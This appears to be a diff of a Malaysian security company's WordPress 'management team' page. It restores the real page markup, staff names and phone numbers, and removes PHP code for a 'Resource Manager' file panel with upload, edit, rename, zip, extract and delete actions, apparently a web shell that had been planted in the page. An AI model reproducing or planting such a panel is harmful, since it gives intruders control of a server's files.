50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--font-size--small: 13px;--wp--preset--font-size--medium: 20px;--wp--preset--font-size--large: 36px;--wp--preset--font-size--x-large: 42px;--wp--preset--spacing--20: 0.44rem;--wp--preset--spacing--30: 0.67rem;--wp--preset--spacing--40: 1rem;--wp--preset--spacing--50: 1.5rem;--wp--preset--spacing--60: 2.25rem;--wp--preset--spacing--70: 3.38rem;--wp--preset--spacing--80: 5.06rem;--wp--preset--shadow--natural: 6px 6px 9px rgba(0, 0, 0, 0.2);--wp--preset--shadow--deep: 12px 12px 50px rgba(0, 0, 0, 0.4);--wp--preset--shadow--sharp: 6px 6px 0px rgba(0, 0, 0, 0.2);--wp--preset--shadow--outlined: 6px 6px 0px -3px rgb(255, 255, 255), 6px 6px rgb(0, 0, 0);--wp--preset--shadow--crisp: 6px 6px 0px rgb(0, 0, 0);}:root { --wp--style--global--content-size: var(--wp--custom--ast-content-width-size);--wp--style--global--wide-size: var(--wp--custom--ast-wide-width-size); }:where(body) { margin: 0; }.wp-site-blocks > .alignleft { float: left; margin-right: 2em; }.wp-site-blocks > .alignright { float: right; margin-left: 2em; }.wp-site-blocks > .aligncenter { justify-content: center; margin-left: auto; margin-right: auto; }:where(.wp-site-blocks) > * { margin-block-start: 24px; margin-block-end: 0; }:where(.wp-site-blocks) > :first-child { margin-block-start: 0; }:where(.wp-site-blocks) > :last-child { margin-block-end: 0; }:root { --wp--style--block-gap: 24px; }:root :where(.is-layout-flow) > :first-child{margin-block-start: 0;}:root :where(.is-layout-flow) > :last-child{margin-block-end: 0;}:root :where(.is-layout-flow) > *{margin-block-start: 24px;margin-block-end: 0;}:root :where(.is-layout-constrained) > :first-child{margin-block-start: 0;}:root :where(.is-layout-constrained) > :last-child{margin-block-end: 0;}:root :where(.is-layout-constrained) > *{margin-block-start: 24px;margin-block-end: 0;}:root :where(.is-layout-flex){gap: 24px;}:root :where(.is-layout-grid){gap: 24px;}.is-layout-flow > .alignleft{float: left;margin-inline-start: 0;margin-inline-end: 2em;}.is-layout-flow > .alignright{float: right;margin-inline-start: 2em;margin-inline-end: 0;}.is-layout-flow > .aligncenter{margin-left: auto !important;margin-right: auto !important;}.is-layout-constrained > .alignleft{float: left;margin-inline-start: 0;margin-inline-end: 2em;}.is-layout-constrained > .alignright{float: right;margin-inline-start: 2em;margin-inline-end: 0;}.is-layout-constrained > .aligncenter{margin-left: auto !important;margin-right: auto !important;}.is-layout-constrained > :where(:not(.alignleft):not(.alignright):not(.alignfull)){max-width: var(--wp--style--global--content-size);margin-left: auto !important;margin-right: auto !important;}.is-layout-constrained > .alignwide{max-width: var(--wp--style--global--wide-size);}body .is-layout-flex{display: flex;}.is-layout-flex{flex-wrap: wrap;align-items: center;}.is-layout-flex > :is(*, div){margin: 0;}body .is-layout-grid{display: grid;}.is-layout-grid > :is(*, div){margin: 0;}body{padding-top: 0px;padding-right: 0px;padding-bottom: 0px;padding-left: 0px;}a:where(:not(.wp-element-button)){text-decoration: none;}:root :where(.wp-element-button, .wp-block-button__link){background-color: #32373c;border-width: 0;color: #fff;font-family: inherit;font-size: inherit;font-style: inherit;font-weight: inherit;letter-spacing: inherit;line-height: inherit;padding-top: calc(0.667em + 2px);padding-right: calc(1.333em + 2px);padding-bottom: calc(0.667em + 2px);padding-left: calc(1.333em + 2px);text-decoration: none;text-transform: inherit;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-ast-global-color-0-color{color: var(--wp--preset--color--ast-global-color-0) !important;}.has-ast-global-color-1-color{color: var(--wp--preset--color--ast-global-color-1) !important;}.has-ast-global-color-2-color{color: var(--wp--preset--color--ast-global-color-2) !important;}.has-ast-global-color-3-color{color: var(--wp--preset--color--ast-global-color-3) !important;}.has-ast-global-color-4-color{color: var(--wp--preset--color--ast-global-color-4) !important;}.has-ast-global-color-5-color{color: var(--wp--preset--color--ast-global-color-5) !important;}.has-ast-global-color-6-color{color: var(--wp--preset--color--ast-global-color-6) !important;}.has-ast-global-color-7-color{color: var(--wp--preset--color--ast-global-color-7) !important;}.has-ast-global-color-8-color{color: var(--wp--preset--color--ast-global-color-8) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-ast-global-color-0-background-color{background-color: var(--wp--preset--color--ast-global-color-0) !important;}.has-ast-global-color-1-background-color{background-color: var(--wp--preset--color--ast-global-color-1) !important;}.has-ast-global-color-2-background-color{background-color: var(--wp--preset--color--ast-global-color-2) !important;}.has-ast-global-color-3-background-color{background-color: var(--wp--preset--color--ast-global-color-3) !important;}.has-ast-global-color-4-background-color{background-color: var(--wp--preset--color--ast-global-color-4) !important;}.has-ast-global-color-5-background-color{background-color: var(--wp--preset--color--ast-global-color-5) !important;}.has-ast-global-color-6-background-color{background-color: var(--wp--preset--color--ast-global-color-6) !important;}.has-ast-global-color-7-background-color{background-color: var(--wp--preset--color--ast-global-color-7) !important;}.has-ast-global-color-8-background-color{background-color: var(--wp--preset--color--ast-global-color-8) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-ast-global-color-0-border-color{border-color: var(--wp--preset--color--ast-global-color-0) !important;}.has-ast-global-color-1-border-color{border-color: var(--wp--preset--color--ast-global-color-1) !important;}.has-ast-global-color-2-border-color{border-color: var(--wp--preset--color--ast-global-color-2) !important;}.has-ast-global-color-3-border-color{border-color: var(--wp--preset--color--ast-global-color-3) !important;}.has-ast-global-color-4-border-color{border-color: var(--wp--preset--color--ast-global-color-4) !important;}.has-ast-global-color-5-border-color{border-color: var(--wp--preset--color--ast-global-color-5) !important;}.has-ast-global-color-6-border-color{border-color: var(--wp--preset--color--ast-global-color-6) !important;}.has-ast-global-color-7-border-color{border-color: var(--wp--preset--color--ast-global-color-7) !important;}.has-ast-global-color-8-border-color{border-color: var(--wp--preset--color--ast-global-color-8) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}
+/*# sourceURL=global-styles-inline-css */
+</style>
+<link rel='stylesheet' id='widget-divider-css' href='https://dgf.com.my/wp-content/plugins/elementor/assets/css/widget-divider.min.css?ver=3.24.5' media='all' />
+
 </head>
-<body>';
 
-        // ---- Top bar ----
-        echo '
-<div class="topbar">
-  <div class="brand"><i class="bi bi-hdd-network"></i> Resource Manager</div>
-  <div class="top-acts">
-    <button id="themeBtn" class="btn btn-outline-light btn-sm"><i class="bi bi-moon-stars-fill"></i></button>
-    <a href="?do_exit=1" class="btn btn-outline-light btn-sm"><i class="bi bi-box-arrow-right"></i> Exit</a>
-  </div>
-</div>
-<div class="wrap">';
+<body itemtype='https://schema.org/WebPage' itemscope='itemscope' class="wp-singular page-template-default page page-id-1733 wp-custom-logo wp-theme-astra ehf-footer ehf-template-astra ehf-stylesheet-astra ast-desktop ast-page-builder-template ast-no-sidebar astra-4.0.2 ast-header-custom-item-inside ast-single-post ast-inherit-site-logo-transparent ast-theme-transparent-header elementor-default elementor-kit-1215 elementor-page elementor-page-1733">
 
-        if ($flash) echo $flash;
+<a
+	class="skip-link screen-reader-text"
+	href="#content"
+	role="link"
+	title="Skip to content">
+		Skip to content</a>
 
-        echo '
-<div class="card">
-<div class="card-h">
-<nav aria-label="breadcrumb">
-<ol class="breadcrumb mb-0">
-<li class="breadcrumb-item"><a href="?"><i class="bi bi-house-door"></i> Root</a></li>';
+<div
+class="hfeed site" id="page">
+			<header
+		class="site-header ast-primary-submenu-animation-slide-up header-main-layout-1 ast-primary-menu-enabled ast-menu-toggle-icon ast-mobile-header-inline" id="masthead" itemtype="https://schema.org/WPHeader" itemscope="itemscope" itemid="#masthead"		>
+			
+<div class="main-header-bar-wrap">
+	<div class="main-header-bar">
+				<div class="ast-container">
 
-        $parts    = explode('/', trim($rel, '/'));
-        $cum_path = '';
-        foreach ($parts as $part) {
-            if ($part === '') continue;
-            $cum_path .= '/' . $part;
-            echo '<li class="breadcrumb-item"><a href="?go=' . urlencode($cum_path) . '"><i class="bi bi-folder2-open"></i> ' . $this->esc($part) . '</a></li>';
-        }
+			<div class="ast-flex main-header-container">
+				
+		<div class="site-branding">
+			<div
+			class="ast-site-identity" itemtype="https://schema.org/Organization" itemscope="itemscope"			>
+				<span class="site-logo-img"><a href="https://dgf.com.my/" class="custom-logo-link" rel="home"><img width="171" height="71" src="https://dgf.com.my/wp-content/uploads/2020/10/cropped-logo-01-1-171x71.png" class="custom-logo" alt="DYNAMIC GUARDFORCE SDN. BHD." decoding="async" srcset="https://dgf.com.my/wp-content/uploads/2020/10/cropped-logo-01-1-171x71.png 171w, https://dgf.com.my/wp-content/uploads/2020/10/cropped-logo-01-1-300x124.png 300w, https://dgf.com.my/wp-content/uploads/2020/10/cropped-logo-01-1-1024x423.png 1024w, https://dgf.com.my/wp-content/uploads/2020/10/cropped-logo-01-1-768x318.png 768w, https://dgf.com.my/wp-content/uploads/2020/10/cropped-logo-01-1-1536x635.png 1536w, https://dgf.com.my/wp-content/uploads/2020/10/cropped-logo-01-1-2048x847.png 2048w" sizes="(max-width: 171px) 100vw, 171px" /></a></span><div class="ast-site-title-wrap">
+						<span class="site-title" itemprop="name">
+				<a href="https://dgf.com.my/" rel="home" itemprop="url" >
+					DYNAMIC GUARDFORCE SDN. BHD.
+				</a>
+			</span>
+						
+				</div>			</div>
+		</div>
 
-        echo '
-</ol></nav></div>
-<div class="card-b">';
+		<!-- .site-branding -->
+				<div class="ast-mobile-menu-buttons">
 
-        // Toolbar
-        echo '
-<div class="toolbar">
-<form class="d-flex gap-2" method="get">
-<input type="hidden" name="go" value="' . $this->esc($go) . '">
-<input type="text" class="form-control" name="search" value="' . $this->esc($search) . '" placeholder="Search resources...">
-<select name="sort" class="form-select" style="width:100px">
-<option value="name"' . ($sort === 'name' ? ' selected' : '') . '>Name</option>
-<option value="size"' . ($sort === 'size' ? ' selected' : '') . '>Size</option>
-<option value="date"' . ($sort === 'date' ? ' selected' : '') . '>Date</option>
-<option value="type"' . ($sort === 'type' ? ' selected' : '') . '>Type</option>
-</select>
-<button class="btn btn-outline-secondary btn-sm">Filter</button>
-</form>
-<div class="ms-auto d-flex gap-1">
-<button class="btn btn-outline-danger btn-sm" id="btnDel" disabled onclick="doBatch(\'del\')"><i class="bi bi-trash"></i> Delete</button>
-<button class="btn btn-outline-secondary btn-sm" id="btnZip" disabled onclick="doBatch(\'zip\')"><i class="bi bi-file-zip"></i> Zip</button>
-</div>
-</div>';
+			
+					<div class="ast-button-wrap">
+			<button type="button" class="menu-toggle main-header-menu-toggle  ast-mobile-menu-buttons-fill "  aria-controls='primary-menu' aria-expanded='false'>
+				<span class="screen-reader-text">Main Menu</span>
+				<span class="ast-icon icon-menu-bars"><span class="menu-toggle-icon"></span></span>							</button>
+		</div>
+			
+			
+		</div>
+			<div class="ast-main-header-bar-alignment"><div class="main-header-bar-navigation"><nav class="site-navigation ast-flex-grow-1 navigation-accessibility" id="primary-site-navigation" aria-label="Site Navigation" itemtype="https://schema.org/SiteNavigationElement" itemscope="itemscope"><div class="main-navigation"><ul id="primary-menu" class="main-header-menu ast-menu-shadow ast-nav-menu ast-flex ast-justify-content-flex-end  submenu-with-border astra-menu-animation-slide-up "><li id="menu-item-21" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-home menu-item-21"><a href="https://dgf.com.my/" class="menu-link">HOME</a></li>
+<li id="menu-item-1668" class="menu-item menu-item-type-custom menu-item-object-custom current-menu-ancestor current-menu-parent menu-item-has-children menu-item-1668"><a href="#" class="menu-link">ABOUT US</a><button class="ast-menu-toggle" aria-expanded="false"><span class="screen-reader-text">Menu Toggle</span><span class="ast-icon icon-arrow"></span></button>
+<ul class="sub-menu">
+	<li id="menu-item-2367" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2367"><a href="https://dgf.com.my/who-we-are/" class="menu-link">Who We Are?</a></li>
+	<li id="menu-item-20" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-20"><a href="https://dgf.com.my/corporate-information/" class="menu-link">Corporate Information</a></li>
+	<li id="menu-item-1947" class="menu-item menu-item-type-post_type menu-item-object-page current-menu-item page_item page-item-1733 current_page_item menu-item-1947"><a href="https://dgf.com.my/management-team/" aria-current="page" class="menu-link">Management Team</a></li>
+	<li id="menu-item-1709" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1709"><a href="https://dgf.com.my/org-chart/" class="menu-link">Organization Chart</a></li>
+	<li id="menu-item-2092" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2092"><a href="https://dgf.com.my/why-us/" class="menu-link">Why us?</a></li>
+	<li id="menu-item-2675" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2675"><a href="https://dgf.com.my/whistleblowing-policy/" class="menu-link">Whistleblowing</a></li>
+</ul>
+</li>
+<li id="menu-item-1934" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-1934"><a href="#" class="menu-link">ACCREDITATION</a><button class="ast-menu-toggle" aria-expanded="false"><span class="screen-reader-text">Menu Toggle</span><span class="ast-icon icon-arrow"></span></button>
+<ul class="sub-menu">
+	<li id="menu-item-1964" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1964"><a href="https://dgf.com.my/licenses/" class="menu-link">Licenses</a></li>
+	<li id="menu-item-1702" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1702"><a href="https://dgf.com.my/certificates/" class="menu-link">Certificates</a></li>
+	<li id="menu-item-1963" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1963"><a href="https://dgf.com.my/membership/" class="menu-link">Membership</a></li>
+	<li id="menu-item-1962" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1962"><a href="https://dgf.com.my/security-guarantee/" class="menu-link">Security Guarantee</a></li>
+	<li id="menu-item-1797" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1797"><a href="https://dgf.com.my/appreciation/" class="menu-link">Testimonial</a></li>
+</ul>
+</li>
+<li id="menu-item-1936" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1936"><a href="https://dgf.com.my/services/" class="menu-link">SERVICES</a></li>
+<li id="menu-item-1935" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-1935"><a href="#" class="menu-link">CLIENT</a><button class="ast-menu-toggle" aria-expanded="false"><span class="screen-reader-text">Menu Toggle</span><span class="ast-icon icon-arrow"></span></button>
+<ul class="sub-menu">
+	<li id="menu-item-2026" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2026"><a href="https://dgf.com.my/our-current-clientele/" class="menu-link">Our Current Clientele</a></li>
+	<li id="menu-item-2025" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2025"><a href="https://dgf.com.my/our-service-history/" class="menu-link">Our Service History</a></li>
+</ul>
+</li>
+<li id="menu-item-18" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-18"><a href="https://dgf.com.my/contact/" class="menu-link">CONTACT US</a></li>
+</ul></div></nav></div></div>			</div><!-- Main Header Container -->
+		</div><!-- ast-row -->
+			</div> <!-- Main Header Bar -->
+</div> <!-- Main Header Bar Wrap -->
+		</header><!-- #masthead -->
+			<div id="content" class="site-content">
+		<div class="ast-container">
+		
 
-        // Upload area
-        echo '
-<div class="d-flex gap-2 align-items-center mb-2">
-<input type="file" multiple class="form-control form-control-sm" id="fileInput" style="max-width:400px">
-<button type="button" class="btn btn-sm btn-success" id="uploadBtn"><i class="bi bi-cloud-upload"></i> Upload</button>
-</div>
-<div class="drop-zone" id="dropZone">
-<i class="bi bi-cloud-arrow-up"></i> Drag &amp; drop files here
-<div class="prog-bar" id="progBar"><div class="prog-fill" id="progFill"></div></div>
-</div>';
+	<div id="primary" class="content-area primary">
 
-        // Creators
-        echo '
-<div class="creators">
-<form id="newFolderForm" onsubmit="return createItem(event,\'folder\')">
-<input type="text" id="newFolderName" class="form-control form-control-sm" placeholder="New folder" required>
-<button class="btn btn-sm btn-outline-primary"><i class="bi bi-folder-plus"></i> Folder</button>
-</form>
-<form id="newFileForm" onsubmit="return createItem(event,\'file\')">
-<input type="text" id="newFileName" class="form-control form-control-sm" placeholder="new-file.txt" required>
-<button class="btn btn-sm btn-outline-secondary"><i class="bi bi-file-plus"></i> File</button>
-</form>
-</div>';
+		
+					<main id="main" class="site-main">
+				<article
+class="post-1733 page type-page status-publish ast-article-single" id="post-1733" itemtype="https://schema.org/CreativeWork" itemscope="itemscope">
+	
+	
+	<header class="entry-header ast-no-thumbnail ast-no-title ast-header-without-markup">
+			</header> <!-- .entry-header -->
 
-        // Resource table
-        echo '
-<form id="resForm" method="post">
-<input type="hidden" name="_csrf" value="' . $csrf . '">
-<table class="rt">
-<thead><tr>
-<th style="width:30px"><input type="checkbox" id="selAll"></th>
-<th>Name</th>
-<th class="meta">Type</th>
-<th class="meta">Size</th>
-<th class="meta">Modified</th>
-<th>Actions</th>
-</tr></thead>
-<tbody>';
 
-        foreach ($resources as $name) {
-            if ($search && stripos($name, $search) === false) continue;
+<div class="entry-content clear"
+	itemprop="text">
 
-            $path   = $this->active_dir . DS . $name;
-            $is_dir = $this->fs_is_dir($path);
-            $icon   = $is_dir
-                ? '<i class="bi bi-folder-fill"></i>'
-                : '<i class="bi bi-file-earmark-text"></i>';
-            $ext   = $is_dir ? '-' : strtoupper(pathinfo($name, PATHINFO_EXTENSION) ?: '-');
-            $size  = $is_dir ? '-' : $this->human_size((int)$this->fs_filesize($path));
-            $mtime = (string)@date('M j, Y H:i', (int)$this->fs_filemtime($path));
-            $en    = $this->esc($name);
-            $er    = urlencode($go);
+	
+			<div data-elementor-type="wp-post" data-elementor-id="1733" class="elementor elementor-1733">
+						<section class="elementor-section elementor-top-section elementor-element elementor-element-50013b3 elementor-section-content-bottom elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="50013b3" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
+							<div class="elementor-background-overlay"></div>
+							<div class="elementor-container elementor-column-gap-no">
+					<div class="elementor-column elementor-col-50 elementor-top-column elementor-element elementor-element-f9a97c3" data-id="f9a97c3" data-element_type="column">
+			<div class="elementor-widget-wrap elementor-element-populated">
+						<div class="elementor-element elementor-element-d5a718f elementor-widget elementor-widget-heading" data-id="d5a718f" data-element_type="widget" data-widget_type="heading.default">
+				<div class="elementor-widget-container">
+			<h1 class="elementor-heading-title elementor-size-default">management team</h1>		</div>
+				</div>
+					</div>
+		</div>
+				<div class="elementor-column elementor-col-50 elementor-top-column elementor-element elementor-element-f140d3b" data-id="f140d3b" data-element_type="column">
+			<div class="elementor-widget-wrap elementor-element-populated">
+						<div class="elementor-element elementor-element-15a16a6 elementor-widget elementor-widget-heading" data-id="15a16a6" data-element_type="widget" data-widget_type="heading.default">
+				<div class="elementor-widget-container">
+			<h6 class="elementor-heading-title elementor-size-default">HEADQUARTERS</h6>		</div>
+				</div>
+				<div class="elementor-element elementor-element-34759fa elementor-align-right elementor-mobile-align-left elementor-icon-list--layout-traditional elementor-list-item-link-full_width elementor-widget elementor-widget-icon-list" data-id="34759fa" data-element_type="widget" data-widget_type="icon-list.default">
+				<div class="elementor-widget-container">
+					<ul class="elementor-icon-list-items">
+							<li class="elementor-icon-list-item">
+											<span class="elementor-icon-list-icon">
+							<i aria-hidden="true" class="fas fa-phone"></i>						</span>
+										<span class="elementor-icon-list-text">+603-4043 1786 / +603-4043 2786 </span>
+									</li>
+						</ul>
+				</div>
+				</div>
+					</div>
+		</div>
+					</div>
+		</section>
+				<section class="elementor-section elementor-top-section elementor-element elementor-element-7d2f7c24 elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="7d2f7c24" data-element_type="section">
+						<div class="elementor-container elementor-column-gap-no">
+					<div class="elementor-column elementor-col-100 elementor-top-column elementor-element elementor-element-177f196f" data-id="177f196f" data-element_type="column">
+			<div class="elementor-widget-wrap elementor-element-populated">
+						<section class="elementor-section elementor-inner-section elementor-element elementor-element-6f84691 elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="6f84691" data-element_type="section">
+						<div class="elementor-container elementor-column-gap-no">
+					<div class="elementor-column elementor-col-50 elementor-inner-column elementor-element elementor-element-9387ea7" data-id="9387ea7" data-element_type="column">
+			<div class="elementor-widget-wrap elementor-element-populated">
+						<div class="elementor-element elementor-element-a7aa0eb elementor-widget elementor-widget-text-editor" data-id="a7aa0eb" data-element_type="widget" data-widget_type="text-editor.default">
+				<div class="elementor-widget-container">
+							<p style="text-align: right;"><strong>CHAIRMAN</strong></p><p style="text-align: right;"><strong>MANAGING DIRECTOR</strong></p><p style="text-align: right;"><strong>EXECUTIVE DIRECTOR</strong></p><p style="text-align: right;"><strong style="font-size: 16px;">SENIOR FINANCE MANAGER</strong></p><p style="text-align: right;"><b>SENIOR MANAGER</b></p><p style="text-align: right;"><b>ADMINISTRATIVE MANAGER</b></p><p style="text-align: right;"><b>HUMAN RESOURCES MANAGER</b></p><p style="text-align: right;"><span style="font-size: 16px; font-style: normal; font-weight: bold;">HEAD OF MARKETING</span></p>						</div>
+				</div>
+					</div>
+		</div>
+				<div class="elementor-column elementor-col-50 elementor-inner-column elementor-element elementor-element-aff31b3" data-id="aff31b3" data-element_type="column">
+			<div class="elementor-widget-wrap elementor-element-populated">
+						<div class="elementor-element elementor-element-94ea453 elementor-widget elementor-widget-text-editor" data-id="94ea453" data-element_type="widget" data-widget_type="text-editor.default">
+				<div class="elementor-widget-container">
+							<p>Tn. Lokman Bin Alias</p>
+<p>Tn. Mubaraq Bin Nawab Jan</p>
+<p>Tn. Ravichanthiran A/L Muniappan</p>
+<p><span style="font-size: 16px;">Pn. Nur Qistina Binti Noordin</span></p>
+<p><span style="font-size: 16px;">Tn. Mohamad Akni Akim Bin Saharudin</span></p>
+<p><span style="font-size: 16px; font-style: normal; font-weight: 400;">Tengku Fazriil Izwaan Shah Bin Tengku Izhar Shah</span></p>
+<p><span style="font-size: 16px; font-style: normal; font-weight: 400;">Pn. Nurul Nadia Binti Zainal Abidin</span></p>
+<p><span style="font-size: 16px; font-style: normal; font-weight: 400;">Pn. Umi Kalsum Bt Mohamid</span></p>						</div>
+				</div>
+					</div>
+		</div>
+					</div>
+		</section>
+					</div>
+		</div>
+					</div>
+		</section>
+				</div>
+		
+	
+	
+</div><!-- .entry-content .clear -->
 
-            echo '<tr>';
-            echo '<td><input type="checkbox" class="ck-item" name="sel[]" value="' . $en . '"></td>';
-            echo '<td><div class="rn">' . $icon . ' ';
+	
+	
+</article><!-- #post-## -->
 
-            if ($is_dir) {
-                echo '<a href="?go=' . urlencode(str_replace($this->root_path, '', $path)) . '">' . $en . '</a>';
-            } else {
-                echo '<a href="?go=' . $er . '&dl=' . urlencode($name) . '">' . $en . '</a>';
-            }
+			</main><!-- #main -->
+			
+		
+	</div><!-- #primary -->
 
-            echo '</div></td>';
-            echo '<td class="meta">' . $ext . '</td>';
-            echo '<td class="meta">' . $size . '</td>';
-            echo '<td class="meta">' . $this->esc($mtime) . '</td>';
-            echo '<td class="acts-col"><div class="btn-group">';
 
-            if (!$is_dir) {
-                echo '<button type="button" class="btn btn-outline-info" onclick="editFile(\'' . $en . '\')"><i class="bi bi-pencil"></i></button>';
-                echo '<button type="button" class="btn btn-outline-secondary" onclick="previewFile(\'' . $en . '\')"><i class="bi bi-eye"></i></button>';
-            } else {
-                echo '<a href="?go=' . urlencode(str_replace($this->root_path, '', $path)) . '" class="btn btn-outline-secondary"><i class="bi bi-folder2-open"></i></a>';
-            }
-
-            echo '<a href="?go=' . $er . '&zip=' . urlencode($name) . '" class="btn btn-outline-secondary"><i class="bi bi-file-zip"></i></a>';
-            echo '<button type="button" class="btn btn-outline-warning" onclick="renameFile(\'' . $en . '\')"><i class="bi bi-pencil-square"></i></button>';
-
-            if (strtolower(pathinfo($name, PATHINFO_EXTENSION)) === 'zip') {
-                echo '<button type="button" class="btn btn-outline-success" onclick="extractFile(\'' . $en . '\')"><i class="bi bi-box-arrow-up"></i></button>';
-            }
-
-            echo '<a href="?go=' . $er . '&rm=' . urlencode($name) . '" class="btn btn-outline-danger" onclick="return confirm(\'Remove ' . $en . '?\')"><i class="bi bi-trash"></i></a>';
-            echo '</div></td></tr>';
-        }
-
-        echo '
-</tbody></table></form>
-</div></div>
-<div class="pg-foot">Resource Manager v' . SVC_VER . '</div>
-</div>';
-
-        // ---- Modals ----
-        echo '
-<!-- Edit Modal -->
-<div class="modal fade" id="editModal" tabindex="-1">
-<div class="modal-dialog modal-lg"><div class="modal-content">
-<div class="modal-header"><h5 class="modal-title">Edit: <span id="editTitle"></span></h5>
-<button type="button" class="btn-close" data-bs-dismiss="modal"></button></div>
-<div class="modal-body">
-<textarea id="codeEditor" class="form-control" rows="22"></textarea>
-<input type="hidden" id="editNameH">
-</div>
-<div class="modal-footer">
-<button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
-<button type="button" id="saveBtn" class="btn btn-primary" onclick="doSave()"><i class="bi bi-save"></i> Save</button>
-</div></div></div></div>
-
-<!-- Rename Modal -->
-<div class="modal fade" id="renameModal" tabindex="-1">
-<div class="modal-dialog"><div class="modal-content">
-<div class="modal-header"><h5 class="modal-title">Rename</h5>
-<button type="button" class="btn-close" data-bs-dismiss="modal"></button></div>
-<div class="modal-body">
-<input type="hidden" id="renameOld">
-<input type="text" id="renameNew" class="form-control" placeholder="New name">
-</div>
-<div class="modal-footer">
